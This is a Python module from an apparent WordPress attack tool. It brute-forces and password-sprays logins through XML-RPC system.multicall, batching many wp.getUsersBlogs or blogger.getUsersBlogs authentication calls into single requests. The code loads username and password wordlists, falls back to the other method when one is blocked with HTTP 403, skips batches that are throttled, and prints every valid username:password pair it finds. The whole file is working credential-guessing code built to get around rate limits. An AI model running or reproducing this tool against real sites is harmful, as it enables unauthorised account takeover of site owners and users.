import time
import httpx
from .rpc import call, parse_response, parse_fault
from .wordlist import load_wordlist, show_wordlist_info
from .output import colorize, RED, GREEN, YELLOW


THROTTLE_KEYWORDS = (
    "too many",
    "rate limit",
    "rate-limit",
    "throttl",
    "temporarily blocked",
    "try again later",
    "locked out",
    "lockout",
)

CONFIRM_THRESHOLD = 10000

PROGRESS_INTERVAL = 5


AUTH_METHODS = {
    "wp.getUsersBlogs": lambda username, password: [username, password],
    "blogger.getUsersBlogs": lambda username, password: ["", username, password],
}


def build_batch(combos, auth_method):
    param_builder = AUTH_METHODS[auth_method]

    return [
        {
            "methodName": auth_method,
            "params": param_builder(username, password)
        }
        for username, password in combos
    ]


def get_fault_message(value):
    fault = value.find("struct")

    if fault is None:
        return ""

    message = ""

    for member in fault.findall("member"):
        name = member.find("name")
        value_node = member.find("value")

        if name is None or value_node is None:
            continue

        if name.text in ("faultString", "message"):
            message = "".join(value_node.itertext()).strip()
            break

    return message


def classify_result(value):
    fault = value.find("struct")

    if fault is None:
        return "success"

    message = get_fault_message(value).lower()

    for keyword in THROTTLE_KEYWORDS:
        if keyword in message:
            return "throttled"

    if "incorrect username or password" in message:
        return "rejected"

    if "invalid username or password" in message:
        return "rejected"

    if "authentication" in message:
        return "rejected"

    return "rejected"


def parse_multicall_results(root):
    results = []

    array = root.find(".//array/data")

    if array is None:
        return results

    for value in array.findall("value"):
        results.append(classify_result(value))

    return results


def run_batch(endpoint, combos, auth_method):
    calls = build_batch(combos, auth_method)

    try:
        response = call(
            endpoint,
            "system.multicall",
            [calls]
        )
    except httpx.RequestError as exc:
        return {
            "success": False,
            "network_error": True,
            "error": str(exc)
        }

    parsed = parse_response(response)

    if parsed is None:
        return {
            "success": False,
            "error": "Invalid XML-RPC response",
            "status": response.status_code
        }

    if parsed["type"] == "fault":
        return {
            "success": False,
            "fault": parse_fault(parsed["root"]),
            "status": response.status_code
        }

    results = parse_multicall_results(parsed["root"])

    return {
        "success": True,
        "status": response.status_code,
        "attempts": len(combos),
        "results": results
    }


def build_combos(usernames, passwords, spray=True):
    if spray:
        return [
            (username, password)
            for password in passwords
            for username in usernames
        ]

    return [
        (username, password)
        for username in usernames
        for password in passwords
    ]


def run(result):
    endpoint = result["endpoint"]
    methods = result.get("methods", [])

    if "wp.getUsersBlogs" in methods:
        auth_method = "wp.getUsersBlogs"
    elif "blogger.getUsersBlogs" in methods:
        auth_method = "blogger.getUsersBlogs"
    else:
        print(colorize("\n[-] No supported authentication method exposed", RED))
        return

    print("\n[*] Multicall test")
    print(f"[*] Auth method: {auth_method}")

    print("\nUsername source:")
    print("  [1] Single username")
    print("  [2] Username wordlist")
    username_choice = input("  > ").strip()

    username_is_wordlist = username_choice == "2"

    if username_is_wordlist:
        username_path = input("Username wordlist path: ").strip()
        usernames = load_wordlist(username_path)
        show_wordlist_info("Usernames", usernames)
    else:
        single_username = input("Username: ").strip()
        usernames = [single_username] if single_username else []

    if not usernames:
        print(colorize("[-] No usernames loaded", RED))
        return

    if username_is_wordlist:
        print("\nPassword source:")
        print("  [1] Single password")
        print("  [2] Password wordlist")
        password_choice = input("  > ").strip()

        if password_choice == "2":
            password_path = input("Password wordlist path: ").strip()
            passwords = load_wordlist(password_path)
            show_wordlist_info("Passwords", passwords)
        else:
            single_password = input("Password: ").strip()
            passwords = [single_password] if single_password else []
    else:
        password_path = input("\nPassword wordlist path: ").strip()
        passwords = load_wordlist(password_path)
        show_wordlist_info("Passwords", passwords)

    if not passwords:
        print(colorize("[-] No passwords loaded", RED))
        return

    try:
        batch_size = int(input("\nBatch size: ").strip())
    except ValueError:
        print(colorize("[-] Invalid batch size", RED))
        return

    if batch_size < 1:
        print(colorize("[-] Batch size must be greater than 0", RED))
        return

    try:
        delay_input = input(
            "Delay between batches in seconds [0]: "
        ).strip()
        delay = float(delay_input) if delay_input else 0.0
    except ValueError:
        print(colorize("[-] Invalid delay", RED))
        return

    if delay < 0:
        print(colorize("[-] Delay must be zero or greater", RED))
        return

    spray = True

    if len(usernames) > 1 and len(passwords) > 1:
        spray_input = input(
            "Spray order (passwords outer loop)? [Y/n]: "
        ).strip().lower()
        spray = spray_input != "n"

    combos = build_combos(usernames, passwords, spray=spray)
    total_combos = len(combos)
    total_requests_planned = -(-total_combos // batch_size)

    print(f"\n[+] Username entries: {len(usernames)}")
    print(f"[+] Password entries: {len(passwords)}")
    print(f"[+] Candidate combinations: {total_combos}")
    print(f"[+] Batch size: {batch_size}")
    print(f"[+] Planned HTTP requests: {total_requests_planned}")

    if total_combos > CONFIRM_THRESHOLD:
        confirm = input(
            colorize(
                f"\n[!] {total_combos} combinations is a large run "
                f"({total_requests_planned} requests). Continue? [y/N]: ",
                YELLOW
            )
        ).strip().lower()

        if confirm != "y":
            print(colorize("[-] Aborted", YELLOW))
            return

    total_attempts = 0
    total_requests = 0
    total_rejected = 0
    total_throttled = 0
    total_unknown = 0
    total_network_errors = 0
    valid_creds = []
    switched = False

    index = 0

    while index < total_combos:
        batch = combos[index:index + batch_size]

        batch_result = run_batch(endpoint, batch, auth_method)

        total_requests += 1

        if not batch_result["success"]:
            status = batch_result.get("status")

            if (
                not switched
                and auth_method == "wp.getUsersBlogs"
                and status == 403
                and "blogger.getUsersBlogs" in methods
            ):
                print(colorize(
                    "\n[!] wp.getUsersBlogs blocked (HTTP 403) - "
                    "falling back to blogger.getUsersBlogs",
                    YELLOW
                ))
                auth_method = "blogger.getUsersBlogs"
                switched = True
                continue

            if batch_result.get("network_error"):
                total_network_errors += 1
                total_attempts += len(batch)
                print(colorize(
                    f"\n[!] Network error, skipping batch: "
                    f"{batch_result.get('error')}",
                    YELLOW
                ))

                if delay:
                    time.sleep(delay)

                index += batch_size
                continue

            if status in (403, 429):
                total_throttled += len(batch)
                total_attempts += len(batch)

                if delay:
                    time.sleep(delay)

                index += batch_size
                continue

            print(colorize("\n[-] Multicall failed", RED))

            if "fault" in batch_result:
                fault = batch_result["fault"]

                message = (
                    fault.get("faultString")
                    or fault.get("message")
                    or "Unknown XML-RPC fault"
                )

                print(f"    {message}")

            else:
                print(f"    {batch_result.get('error', 'Unknown error')}")

            return

        total_attempts += len(batch)

        for (cred_username, cred_password), call_result in zip(batch, batch_result["results"]):
            if call_result == "rejected":
                total_rejected += 1

            elif call_result == "throttled":
                total_throttled += 1

            elif call_result == "success":
                valid_creds.append((cred_username, cred_password))
                print(colorize(
                    f"\n[+] VALID: {cred_username}:{cred_password}",
                    GREEN
                ))

            else:
                total_unknown += 1

        if total_requests % PROGRESS_INTERVAL == 0 or total_attempts == total_combos:
            print(
                f"\r[*] {total_attempts}/{total_combos} tested "
                f"({total_requests}/{total_requests_planned} requests)",
                end="",
                flush=True
            )

        if delay:
            time.sleep(delay)

        index += batch_size

    print()
    print("\n[+] Multicall accepted")
    print(f"[+] HTTP requests: {total_requests}")
    print(f"[+] Authentication attempts: {total_attempts}")
    print(f"[+] Rejected: {total_rejected}")
    print(f"[+] Throttled: {total_throttled}")
    print(f"[+] Network errors: {total_network_errors}")
    print(f"[+] Unknown: {total_unknown}")
    print(colorize(f"[+] Valid credentials found: {len(valid_creds)}", GREEN))

    for cred_username, cred_password in valid_creds:
        print(colorize(f"    {cred_username}:{cred_password}", GREEN))